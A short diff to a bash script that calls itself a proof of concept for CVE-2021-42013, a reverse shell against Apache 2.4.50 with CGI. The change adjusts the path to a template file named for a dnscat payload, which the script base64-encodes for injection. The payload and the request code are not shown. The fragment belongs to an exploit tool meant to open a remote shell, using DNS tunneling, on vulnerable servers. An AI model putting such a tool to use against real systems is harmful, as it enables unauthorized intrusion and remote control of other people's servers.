@@ -10,7 +10,7 @@
 #!/bin/bash
 
 #attach visa deployment
-inject=$(cat templates/attack_dnscat_base64.sh | base64)
+inject=$(cat $(dirname -- "$0")/templates/attack_dnscat_base64.sh | base64)
 
 echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
 if [ $# -eq 0 ]
